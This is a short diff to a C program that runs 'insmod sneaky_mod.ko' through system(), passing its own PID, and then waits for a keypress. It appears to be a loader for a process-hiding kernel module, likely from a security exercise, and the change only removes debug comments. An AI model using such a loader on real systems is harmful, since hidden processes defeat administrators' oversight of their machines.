@@ -11,9 +11,8 @@ int main() {
     //load .ko - insmod
     char cmd_load[100];
     sprintf(cmd_load, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
-    //printf("cmd: %s\n", cmd_load);
     system(cmd_load);
-    //printf("cmd: %s\n", cmd_load);
+
     //loop
     while (getchar() != 'q') {
     }
